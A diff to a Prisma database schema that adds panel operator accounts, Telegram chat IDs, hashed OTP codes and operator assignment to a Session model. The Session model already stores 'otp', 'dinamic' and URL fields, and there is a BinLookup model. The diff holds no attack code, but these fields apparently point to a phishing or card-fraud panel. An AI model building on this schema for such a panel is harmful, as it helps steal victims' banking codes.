@@ -46,6 +46,11 @@ enum ActionState {
   FINISH
 }
 
+enum PanelRole {
+  ADMIN
+  USER
+}
+
 model Session {
   id                    String       @id @default(uuid())
   state                 SessionState @default(ACTIVE)
@@ -73,16 +78,55 @@ model Session {
   city                  String?
   dinamic               String?
   otp                   String?
-  assignedAdminId       String?
   url                   String?
 
   lastError             String?
+
+  // Relación con PanelUser (operador asignado)
+  assignedUserId        String?
+  assignedUser          PanelUser? @relation("AssignedSessions", fields: [assignedUserId], references: [id])
 
   createdAt             DateTime @default(now())
   updatedAt             DateTime @updatedAt
 
   @@index([state])
   @@index([updatedAt])
+  @@index([assignedUserId])
+}
+
+model PanelUser {
+  id          String    @id @default(uuid())
+  laravelId   Int       @unique
+  username    String    @unique
+  alias       String?
+  tgChatId    String?   @unique
+  tgUsername  String?
+  role        PanelRole @default(USER)
+  isActive    Boolean   @default(true)
+  lastLoginAt DateTime?
+  createdAt   DateTime  @default(now())
+  updatedAt   DateTime  @updatedAt
+
+  // Relaciones
+  assignedSessions Session[] @relation("AssignedSessions")
+  otpCodes         OtpCode[]
+
+  @@index([username])
+  @@index([laravelId])
+  @@index([tgChatId])
+}
+
+model OtpCode {
+  id          String    @id @default(uuid())
+  panelUserId String
+  panelUser   PanelUser @relation(fields: [panelUserId], references: [id], onDelete: Cascade)
+  codeHash    String
+  expiresAt   DateTime
+  usedAt      DateTime?
+  createdAt   DateTime  @default(now())
+
+  @@index([panelUserId])
+  @@index([expiresAt])
 }
 
 model BinLookup {
